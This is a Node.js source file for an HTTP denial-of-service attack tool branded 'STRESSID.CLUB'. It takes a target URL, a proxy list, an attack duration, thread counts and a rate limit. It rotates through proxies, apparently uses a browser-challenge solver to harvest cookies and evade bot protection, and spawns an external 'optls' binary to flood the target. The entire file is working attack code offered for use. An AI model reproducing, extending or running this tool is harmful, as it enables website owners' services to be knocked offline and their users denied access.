require('events').EventEmitter.defaultMaxListeners = 0;
const { spawn } = require('child_process');

const { solving } = require('./soonbrowserplay');

const fs = require('fs');

const url = require('url');

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function randomstring(length) {
	var result           = '';
	var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
	var charactersLength = characters.length;
			
	for ( var i = 0; i < length; i++ ) {
		result += characters.charAt(Math.floor(Math.random() * charactersLength));
	}
			
	return result;
}

if (process.argv.length < 5) {
    console.log('\x1b[35m%s\x1b[0m', 'OWNER: STRESSID.CLUB ');
    console.log('\x1b[35m%s\x1b[0m', 'node browser.js GET/POST URL PROXIES TIME THREADS RATELIMIT [OPTIONAL: RANDOM_QUERY]');
    process.exit(0);
}

async function main() {
		const mode = process.argv[2]; // GET or POST
    let target_url = process.argv[3], target = target_url.split('""')[0]; // Target
    const proxyFile = process.argv[4]; // Proxies
    const timeforattack = process.argv[5]; // Time
    const browsernum = process.argv[6]; // Count of browsers
    const reqperip = process.argv[7]; // req per ip
		const rand_query = process.argv[8]; // random string

    const isattackstart = new Map();
		
		// Извлекаем домен для Host
		let domain = url.parse(target_url).hostname;
		
		// Читаем файлы с User Agent, Referers, Proxies
		const
			referers = fs.readFileSync("referer.txt", 'utf-8').toString(),
			useragents = fs.readFileSync("ua.txt", 'utf-8').toString().split('\n'),
			proxies = fs.readFileSync(proxyFile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);

    var session = [];

    Array.prototype.remove = function () {
        var what, a = arguments, L = a.length, ax;
        while (L && this.length) {
            what = a[--L];
            while ((ax = this.indexOf(what)) !== -1) {
                this.splice(ax, 1);
            }
        }
        return this;
    };

		// случаный юзер агент
		function useragent() {
			return useragents[Math.floor(Math.random() * useragents.length)]
		}

    function randomProxies() {
        const whois = proxies[Math.floor(Math.random() * proxies.length)];
        proxies.remove(whois)
        return whois;
    } 
    async function createSession(){
		let random_ua = useragent();
        const randed = randomProxies();
        solving({
            "url":target,
            "proxy":randed,
			"user_agent":random_ua
        }).then((cookie,ua) => {
            let myString = "";
            let laa_ = JSON.stringify(cookie);
            laa_ = JSON.parse(laa_);
            laa_.forEach((value) => {
                const valueString = value.name + "=" + value.value + ";";
                myString += valueString;
            });    
            session.push({
                "myString":myString,
                "reqperip":reqperip,
                "randed":randed,
				"user_agent":random_ua
            })
			start(mode,target,domain,timeforattack,browsernum,random_ua,myString,reqperip,randed,rand_query);
			console.log(`[STRESSID.CLUB] Cookie: ${myString}`)
			console.log(`[STRESSID.CLUB] User-Agent: ${random_ua}`)			
        }).catch((ee) => {
            console.log(ee);
            setTimeout(() => {
                createSession();
            },10000);
        })
    }


    for (let i = 0; i < browsernum; i++) {
        setTimeout(() => {
            createSession();
        },(200 * Math.floor(Math.random() * 20)))
    }	

	
}
main();

function start(mode,target,domain,timeforattack,browsernum,random_ua,myString,reqperip,randed,rand_query) {	
	let promise = new Promise((res,rej) => {
        const ls = spawn('./optls', [target, random_ua, timeforattack, myString, mode,reqperip,randed]);
		//console.log(ls);
        ls.stdout.on('data', (data) => {   
			//console.log(`${data}`);
            return res();
        });
    })
}


